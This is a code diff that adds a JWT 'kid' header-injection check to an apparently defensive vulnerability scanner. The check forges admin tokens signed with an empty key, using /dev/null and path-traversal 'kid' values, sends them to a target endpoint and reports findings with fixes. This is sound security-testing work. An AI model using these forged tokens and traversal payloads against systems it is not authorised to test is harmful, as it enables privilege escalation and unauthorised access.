@@ -59,6 +59,7 @@ class JwtScanner:
 
         out += self._test_alg_none(base, verify_endpoint, token)
         out += self._test_weak_secret(base, verify_endpoint, token)
+        out += self._test_kid_empty_key(base, verify_endpoint, token)
         return out
 
     def _test_alg_none(self, base: str, verify: str, token: str) -> list[Finding]:
@@ -85,6 +86,41 @@ class JwtScanner:
                 recommendation="Enforce a specific algorithm (allowlist), reject alg:none.",
                 reproduction=f"Send to {verify} the header: Authorization: Bearer {forged}",
                 evidence=Evidence(payload=forged, response=r.text[:200])))
+        return out
+
+    def _test_kid_empty_key(self, base: str, verify: str, token: str) -> list[Finding]:
+        """kid header injection: point `kid` at an empty-content file (/dev/null) and sign with an
+        empty key. If the server derives the HMAC key from `kid`, the forged token verifies."""
+        out: list[Finding] = []
+        try:
+            h, p, _s = token.split(".")
+            header = json.loads(_b64url_decode(h))
+            payload = json.loads(_b64url_decode(p))
+        except Exception:  # noqa: BLE001
+            return out
+        if "kid" not in header:
+            return out  # no kid header → this attack does not apply
+        for kid in ("/dev/null", "../../../../../../dev/null", "/proc/sys/kernel/randomize_va_space"):
+            fh = {"alg": "HS256", "kid": kid, "typ": "JWT"}
+            fp = {**payload, "user": "bzkid", "role": "admin"}
+            hp = _b64url_encode(json.dumps(fh).encode()) + "." + _b64url_encode(json.dumps(fp).encode())
+            forged = hp + "." + _sign_hs256(hp, "")   # empty key (contents of /dev/null)
+            r = self.http.get(f"{base}{verify}", headers={"Authorization": f"Bearer {forged}"})
+            if r.status == 200 and ("bzkid" in r.text or '"role":"admin"' in r.text
+                                    or '"role": "admin"' in r.text):
+                self._report(out, Finding(
+                    title=f"JWT kid header injection (empty-key via '{kid}')",
+                    severity=Severity.CRITICAL, owasp="A02:2025 Security Misconfiguration",
+                    cwe="CWE-347", target=f"{base}{verify}", component=verify, source_tool=self.name,
+                    description="The server derives the HMAC key from the token's `kid` header. Pointing "
+                                f"`kid` at empty-content file `{kid}` and signing with an empty key forges "
+                                "any token (e.g. role:admin).",
+                    impact="Full token forgery / privilege escalation without knowing the real secret.",
+                    recommendation="Never derive the verification key from attacker-controlled `kid`; "
+                                   "use a fixed key store; reject unexpected `kid` values.",
+                    reproduction=f"Send to {verify}: Authorization: Bearer {forged}",
+                    evidence=Evidence(payload=forged, response=r.text[:200])))
+                break
         return out
 
     def _test_weak_secret(self, base: str, verify: str, token: str) -> list[Finding]:
